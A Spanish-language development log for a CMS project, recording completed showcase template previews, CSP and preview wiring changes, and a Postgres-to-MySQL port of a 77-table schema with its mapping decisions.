- [x] `saas-magnetic` → **Asme liquid glass**: hero crossfade vídeo + email pill + about + featured video full-bleed + Innovation×Vision split + 2 service cards.
- [x] `launch-marquee` → **Securify+Targo dark**: hero staggered headline + 3 stat blocks posicionados + glass widget consultoría + sectors marquee + 3 pillars + pricing 2-tier con clipped corners.
- [x] `docs-aurora` → **Power AI / Nimbus**: hero gradient text indigo→purple→amber + nav neutral + logo marquee + 6 docs grid + code sample + community.
- [x] `coming-soon-typewriter` → **Mint pre-launch**: hero countdown live (días/h/min/seg) + email capture liquid-glass + 3 perks + roadmap timeline.
- [x] `blog-particles` → **Magazine paper**: masthead serif + featured 8/4 + sidebar últimos + categorías grid colored + 3-col stories + newsletter inline.
- [x] `newsletter-typewriter` → **Substack premium**: signup card + preview número con paywall fade gradient + testimonio gigante + pricing 2-tier elegante + archive list con badges Free/Premium.

### Wiring
- [x] `/template-preview/[id]` ahora prefiere `getShowcase(id)`; fallback al render block-based.
- [x] CSP: `img-src` ampliado con `cloudfront.net`, `figma.site`, `motionsites.ai`, `images.higgs.ai`. `style-src` con `fonts.googleapis.com`. `font-src` con `fonts.gstatic.com`. `media-src https:` ya estaba (vídeos OK).
- [x] Galería `/admin/plantillas` con notice explicando que el preview es la versión espectacular y al insertar se simplifica la versión editable.

### Patrón clave
**Showcase ≠ block layout editable**. Cada plantilla mantiene su `buildLayout()` block-based (lo que se inserta al usar la plantilla, editable desde el page builder), pero el preview usa el showcase custom. Decisión consciente: la versión espectacular requiere ~600-1000 líneas de React custom por plantilla y no se puede expresar en bloques sin añadir ~5 bloques premium nuevos al registry (diferido a F10x).

### Validación
- [x] typecheck verde (`npm run typecheck`)
- [x] biome verde (`npx biome check src/templates/showcase`)

### Estado
Las plantillas ahora están al nivel visual de las que aparecen en `motionsites.ai/prompts`. Cuando el usuario hover sobre un card en `/admin/plantillas`, el iframe carga la versión showcase (motion-rich, vídeo, parallax, etc). Diferenciador claro vs WordPress / Strapi / Sanity / Ghost — ningún CMS open-source 2026 ofrece previews así.

---

## 2026-05-05 — Tarea 15: Schema MySQL completo (77 tablas) ✅ entregado

> Multi-DB design (ADR-001..007 en `docs/architecture/multi-db-design.md`). Postgres queda como dialect default; MySQL 8.4+ ahora tiene schema paralelo paritario.

### Entregable
- [x] `src/db/schema.mysql.ts` con las 77 tablas (5 POC + 72 portadas en esta tarea).
- [x] Type exports lógicamente idénticos a `schema.pg.ts` (mismo set de fields camelCase y mismos tipos JS).
- [x] `npx tsc --noEmit` verde (cero errores nuevos vs baseline).
- [x] `npx biome check src/db/schema.mysql.ts` verde.

### Tablas portadas (72 nuevas)
passkeys, two_factors, rate_limits, members, invitations, collections, branches, branch_activity, branch_comments, entries, revisions, entry_assignments, entry_workflow_events, editorial_threads, editorial_messages, editorial_calendar_tokens, taxonomies, terms, entry_terms, media_folders, media, comments, search_index_jobs, subscribers, subscriber_confirmations, segments, campaigns, campaign_recipients, email_templates, drips, drip_enrollments, email_events, tiers, memberships, member_sessions, member_magic_links, member_events, personalization_rules, forms, form_versions, submissions, api_keys, api_key_audit, webhooks, webhook_deliveries, automations, automation_runs, automation_steps, idempotency_keys, pages, symbols, themes, menus, redirects, settings, activity_log, notifications, analytics_events, ab_tests, ab_assignments, ab_events, imports, import_items, entry_health, entry_health_issues, ai_usage_daily, csp_reports, collab_snapshots, collab_updates, presence_sessions, editorial_reactions, ai_provider_configs.

### Decisiones de mapping no triviales
1. **`vector("embedding", { dimensions: 1536 })`** → `customType` que renderiza `VECTOR(1536)` (MySQL 9+). En MySQL 8.4 el migrador degrada a `VARBINARY(8192)` o delega Qdrant via `src/search/vector/`. Helper `vector(...)` con `toDriver/fromDriver` para serializar `number[]` ↔ string `[1,2,3]` formato.
2. **`text("col").array()`** (11 columnas: workspaces.locales, branchComments.mentions, editorialMessages.mentions, media.aiTags, media.tagsManual, subscribers.tags, comments…tags via aux, forms.notificationEmails, submissions.attachments, submissions.spamReasons, apiKeys.scopes, webhooks.events) → `json("col").$type<T[]>()` interim. Tarea 18 (ADR-002) los normaliza a tablas auxiliares con FK + position.
3. **Partial unique indexes Postgres** (`UNIQUE WHERE col IS NOT NULL`) → MySQL UNIQUE permite múltiples NULL por defecto, así que `entries_branch_original_idx`, `entries_ws_origin_ref_idx`, `branches_preview_token_idx` mantienen su semántica natural sin cambios.
4. **Partial unique sobre `bool=true`** (`branches_ws_default_idx WHERE isDefault=true`, `entry_assignments_entry_role_active_idx WHERE completedAt IS NULL`) → MySQL no soporta. Bajado a non-unique index; enforcement queda en lógica app (`createBranch` valida única main; `createAssignment` valida absence de slot activo).
5. **Expression unique con `COALESCE`** (`ai_usage_daily_unique_idx`) → en MySQL exigimos al caller que normalice `userId=''` (empty string) en lugar de NULL para que el unique compuesto funcione directo. Documentado en JSDoc.
6. **`uuid().defaultRandom()`** → `varchar(36)` sin default; `crypto.randomUUID()` app-side antes del INSERT (ADR-003).
7. **TEXT columns indexed/uniqued** → convertidas a `varchar(N)` con N apropiado (email=320, slug=120, token=120/255, hash=128, url=2048, path=1024). MySQL TEXT no se puede UNIQUE INDEX sin prefix length.
8. **`text("col").default("...")`** → `varchar(N).default(...)`. MySQL TEXT no admite default.
9. **`timestamp.defaultNow()`** → `timestamp({fsp:3}).default(sql\`CURRENT_TIMESTAMP(3)\`)` para preservar precisión de milisegundos.
10. **Self-references** (`comments.parentId`, `branchComments.parentId`) → cambian de `AnyPgColumn` a `AnyMySqlColumn`.
11. **`webhookDeliveries.eventId`** Postgres tiene `defaultRandom()`. En MySQL queda sin default → caller (`enqueueWebhookDelivery`) genera con `crypto.randomUUID()`.

### Verificación
- 77 tablas `mysqlTable(...)` ↔ 77 tablas `pgTable(...)` (paridad confirmada con grep).
- Schema barrel `src/db/schema.ts` SIN tocar (sigue re-exportando Postgres como verdad TS).
- `src/db/client.ts`, call-sites, `drizzle.config.ts` SIN tocar.

### Próximo paso
Tarea 16 (E2E matrix) podrá levantar Docker MySQL y validar flow crítico end-to-end. Tarea 18 (ADR-002) normaliza las 11 columnas array a tablas auxiliares con helper `arrayCol(...)`.
